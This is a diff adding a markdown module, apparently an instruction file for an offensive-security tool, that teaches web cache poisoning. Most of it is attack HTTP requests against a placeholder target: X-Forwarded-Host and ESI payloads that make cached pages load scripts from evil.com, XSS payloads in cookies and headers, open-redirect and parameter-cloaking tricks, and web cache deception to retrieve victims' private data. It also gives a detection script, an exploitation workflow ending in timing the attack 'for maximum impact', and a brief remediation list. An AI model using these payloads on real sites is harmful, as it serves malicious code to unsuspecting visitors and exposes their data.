@@ -1,0 +1,323 @@
+{# Web Cache Poisoning Module #}
+{# Advanced cache poisoning attack techniques #}
+
+<cache_poisoning_module>
+
+## WEB CACHE POISONING GUIDE
+
+### UNDERSTANDING CACHE POISONING
+
+**What is it?**
+Web cache poisoning exploits unkeyed inputs (headers, cookies) that affect the response but aren't part of the cache key, allowing attackers to store malicious responses that are served to other users.
+
+**Key Concepts:**
+- **Cache Key**: The elements used to identify cached responses (URL, Host, etc.)
+- **Unkeyed Input**: Headers/parameters that affect response but aren't in cache key
+- **Cache Buster**: Parameter to ensure fresh cache for testing (?cb=123)
+
+### DETECTING CACHE BEHAVIOR
+
+**Identify Caching:**
+```http
+# Look for cache headers
+Cache-Control: max-age=3600
+X-Cache: HIT
+X-Cache-Status: HIT
+Age: 120
+Cf-Cache-Status: HIT
+X-Varnish: 12345
+Via: 1.1 varnish
+```
+
+**Test for Cache:**
+```bash
+# Request 1
+curl -I https://target.com/page?cb=123
+# Note: X-Cache: MISS
+
+# Request 2
+curl -I https://target.com/page?cb=123
+# Should show: X-Cache: HIT
+```
+
+### FINDING UNKEYED INPUTS
+
+**Common Unkeyed Headers:**
+```http
+X-Forwarded-Host: evil.com
+X-Forwarded-Scheme: http
+X-Forwarded-Proto: http
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Host: evil.com
+X-Forwarded-Server: evil.com
+Forwarded: host=evil.com
+```
+
+**Param Miner (Burp Extension):**
+```
+# Automatically discover unkeyed inputs
+# Right-click request -> Extensions -> Param Miner -> Guess headers
+```
+
+**Manual Testing:**
+```http
+# Test header reflection
+GET /?cb=123 HTTP/1.1
+Host: target.com
+X-Forwarded-Host: canary.evil.com
+
+# Check if reflected in response
+# If yes and cached, vulnerable!
+```
+
+### EXPLOITATION TECHNIQUES
+
+**1. Host Header Poisoning:**
+```http
+GET /script.js HTTP/1.1
+Host: target.com
+X-Forwarded-Host: evil.com
+
+# Response (now cached):
+# <script src="//evil.com/script.js"></script>
+```
+
+**2. Open Redirect Cache Poisoning:**
+```http
+GET /redirect?url=//evil.com HTTP/1.1
+Host: target.com
+
+# If cached, all users redirected to evil.com
+```
+
+**3. Static Resource Poisoning:**
+```http
+GET /js/analytics.js HTTP/1.1
+Host: target.com
+X-Forwarded-Host: evil.com
+
+# Response (cached):
+# All users load analytics.js from evil.com
+```
+
+**4. Cookie-Based Poisoning:**
+```http
+GET /page HTTP/1.1
+Host: target.com
+Cookie: language=x<script>alert(1)</script>
+
+# If language is reflected and not in cache key
+```
+
+**5. Fat GET Requests:**
+```http
+GET /api/user HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 12
+
+id=admin
+# Some caches ignore body in GET but backend processes it
+```
+
+### ADVANCED TECHNIQUES
+
+**Parameter Cloaking:**
+```http
+# Ruby on Rails
+GET /page?id=1;callback=alert HTTP/1.1
+# Cache key: /page?id=1
+# Backend sees: id=1, callback=alert
+
+# Node.js
+GET /page?id=1&__proto__[polluted]=yes HTTP/1.1
+
+# Cache uses first param, backend merges
+GET /page?x=1&x=<script> HTTP/1.1
+```
+
+**URL Normalization Differences:**
+```http
+# Different normalization between cache and origin
+GET /api/users/%2e%2e/admin HTTP/1.1  # ../ encoded
+GET /api/./users/../admin HTTP/1.1
+GET //api//users HTTP/1.1
+GET /api/users;admin HTTP/1.1
+```
+
+**Resource Confusion:**
+```http
+# Poison static resources
+GET /img/logo.png HTTP/1.1
+Host: target.com
+X-Forwarded-Host: evil.com
+
+# If response varies based on header but cache key is just path
+```
+
+**Cache Key Injection:**
+```http
+GET /search HTTP/1.1
+Host: target.com
+User-Agent: Mozilla/5.0
+X-Forwarded-Host: target.com:1234</script><script>alert(1)</script>
+
+# If Host header is reflected in cache key and response
+```
+
+### CDN-SPECIFIC ATTACKS
+
+**Cloudflare:**
+```http
+# Test unkeyed headers
+X-Forwarded-Host:
+X-Forwarded-Scheme:
+X-Original-URL:
+
+# Cache key includes query string by default
+```
+
+**Akamai:**
+```http
+# Pragma header sometimes unkeyed
+Pragma: akamai-x-cache-on
+
+# Check for ESI injection
+<esi:include src="http://evil.com/"/>
+```
+
+**Fastly/Varnish:**
+```http
+# Vary header manipulation
+# Accept-Language sometimes unkeyed
+Accept-Language: en<script>alert(1)</script>
+```
+
+**AWS CloudFront:**
+```http
+# X-Forwarded-For sometimes in cache key
+X-Forwarded-For: 127.0.0.1
+```
+
+### COMBINING WITH OTHER VULNS
+
+**Cache Poisoning + XSS:**
+```http
+GET /page?search=<script>alert(1)</script> HTTP/1.1
+Host: target.com
+
+# If search param reflected AND cached
+# All visitors get XSSed
+```
+
+**Cache Poisoning + Open Redirect:**
+```http
+GET /redirect?next=//evil.com HTTP/1.1
+Host: target.com
+
+# Cache the redirect
+# All visitors redirected
+```
+
+**Cache Deception (stealing data):**
+```http
+# Attacker sends victim link:
+https://target.com/profile.css
+
+# If server responds with profile page (not CSS)
+# And CDN caches based on extension
+# Attacker retrieves cached private data
+```
+
+### DETECTION SCRIPT
+
+```python
+#!/usr/bin/env python3
+"""
+Web Cache Poisoning Detection Script
+"""
+
+import requests
+import random
+import string
+import time
+
+class CachePoisonTester:
+    def __init__(self, base_url):
+        self.base_url = base_url.rstrip('/')
+        self.canary = ''.join(random.choices(string.ascii_lowercase, k=8))
+    
+    def cache_buster(self):
+        return f"cb={''.join(random.choices(string.ascii_lowercase, k=6))}"
+    
+    def test_header(self, header_name, path="/"):
+        """Test if a header is unkeyed and reflected."""
+        url = f"{self.base_url}{path}?{self.cache_buster()}"
+        
+        # Request with poison header
+        headers = {header_name: self.canary}
+        r1 = requests.get(url, headers=headers)
+        
+        if self.canary not in r1.text:
+            return None  # Not reflected
+        
+        # Check if cached
+        time.sleep(1)
+        r2 = requests.get(url)  # No poison header
+        
+        if self.canary in r2.text:
+            return f"VULNERABLE: {header_name} is unkeyed and reflected"
+        
+        return None
+    
+    def scan_common_headers(self, path="/"):
+        """Scan common unkeyed headers."""
+        headers_to_test = [
+            "X-Forwarded-Host",
+            "X-Forwarded-Scheme",
+            "X-Forwarded-Proto",
+            "X-Host",
+            "X-Original-URL",
+            "X-Rewrite-URL",
+            "X-Custom-Header",
+        ]
+        
+        results = []
+        for header in headers_to_test:
+            result = self.test_header(header, path)
+            if result:
+                results.append(result)
+        
+        return results
+
+if __name__ == "__main__":
+    import sys
+    tester = CachePoisonTester(sys.argv[1])
+    results = tester.scan_common_headers()
+    for r in results:
+        print(f"[+] {r}")
+```
+
+### EXPLOITATION WORKFLOW
+
+```
+1. Identify caching (cache headers)
+2. Find unkeyed inputs (Param Miner)
+3. Test reflection in response
+4. Confirm caching of poisoned response
+5. Escalate to XSS/redirect/etc.
+6. Time attack for maximum impact
+```
+
+### REMEDIATION
+
+- [ ] Include all varying inputs in cache key
+- [ ] Validate and sanitize all inputs
+- [ ] Use Vary header correctly
+- [ ] Implement cache validation (ETag, Last-Modified)
+- [ ] Separate static and dynamic content
+- [ ] Review CDN configuration
+- [ ] Monitor for anomalous cache patterns
+
+</cache_poisoning_module>
